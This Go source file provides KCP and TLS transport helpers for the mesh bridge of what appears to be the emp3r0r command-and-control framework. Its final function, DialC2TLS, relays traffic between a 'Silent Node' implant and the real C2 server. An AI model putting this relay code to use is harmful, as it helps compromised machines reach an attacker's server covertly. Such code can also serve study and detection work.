package transport

// mesh_transport.go — thin helpers for the mesh bridge (mesh/bridge.go).
// These are intentionally minimal: they create a single KCP stream without
// the full smux session machinery used by KCPTunClient/KCPTunServer.

import (
	"context"
	"crypto/sha1"
	"fmt"
	"net"

	"golang.org/x/crypto/pbkdf2"

	kcp "github.com/xtaci/kcp-go/v5"
)

// meshKey derives a 32-byte AES key from password using PBKDF2.
func meshKey(password, salt string) []byte {
	return pbkdf2.Key([]byte(password), []byte(salt), 4096, 32, sha1.New)
}

// DialKCP creates a single encrypted KCP stream (AES-256 block cipher) to addr.
// addr is "host:port". password and salt are used to derive the AES-256 key.
// Returns a net.Conn wrapping the KCP session stream.
func DialKCP(addr, password, salt string) (net.Conn, error) {
	key := meshKey(password, salt)
	block, err := kcp.NewAESBlockCrypt(key)
	if err != nil {
		return nil, fmt.Errorf("DialKCP: block cipher: %v", err)
	}
	sess, err := kcp.DialWithOptions(addr, block, 10, 3)
	if err != nil {
		return nil, fmt.Errorf("DialKCP: dial %s: %v", addr, err)
	}
	// Mirror fast-mode settings from KCPTunClient defaults.
	sess.SetNoDelay(1, 10, 2, 1)
	sess.SetWindowSize(128, 1024)
	sess.SetMtu(1350)
	sess.SetACKNoDelay(false)
	return sess, nil
}

// ListenKCP creates a persistent, encrypted KCP listener on kcpPort.
// Caller is responsible for closing it (e.g. when ctx is done).
// Use AcceptKCPConn to accept individual connections from the returned listener.
func ListenKCP(kcpPort, password, salt string) (*kcp.Listener, error) {
	key := meshKey(password, salt)
	block, err := kcp.NewAESBlockCrypt(key)
	if err != nil {
		return nil, fmt.Errorf("ListenKCP: block cipher: %v", err)
	}
	l, err := kcp.ListenWithOptions(":"+kcpPort, block, 10, 3)
	if err != nil {
		return nil, fmt.Errorf("ListenKCP: listen :%s: %v", kcpPort, err)
	}
	return l, nil
}

// AcceptKCPConn accepts the next KCP connection from an existing listener.
// Blocks until a connection arrives or ctx is done.
func AcceptKCPConn(l *kcp.Listener, ctx context.Context) (net.Conn, error) {
	type result struct {
		conn *kcp.UDPSession
		err  error
	}
	ch := make(chan result, 1)
	go func() {
		conn, err := l.AcceptKCP()
		ch <- result{conn, err}
	}()

	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	case r := <-ch:
		if r.err != nil {
			return nil, fmt.Errorf("AcceptKCPConn: %v", r.err)
		}
		r.conn.SetNoDelay(1, 10, 2, 1)
		r.conn.SetWindowSize(128, 1024)
		r.conn.SetMtu(1350)
		return r.conn, nil
	}
}

// DialC2TLS dials the C2 address using a standard TLS connection (via optional proxy).
// Returns a net.Conn that is the raw TLS socket — the mesh bridge uses this to pipe
// bytes between a Silent Node and the real C2 without decrypting.
func DialC2TLS(c2Addr, proxy string) (net.Conn, error) {
	client := CreateEmp3r0rHTTPClient(c2Addr, proxy)
	if client == nil || client.Transport == nil {
		return nil, fmt.Errorf("DialC2TLS: failed to initialize HTTP client for %s", c2Addr)
	}

	transport, ok := client.Transport.(interface {
		DialContext(ctx context.Context, network, addr string) (net.Conn, error)
	})
	if !ok {
		// Fallback: use plain TCP (TLS termination is done by the caller's TLS layer)
		host := c2Addr
		// strip scheme
		for _, pfx := range []string{"https://", "http://"} {
			if len(host) > len(pfx) && host[:len(pfx)] == pfx {
				host = host[len(pfx):]
			}
		}
		return net.Dial("tcp", host)
	}
	return transport.DialContext(context.Background(), "tcp", c2Addr)
}
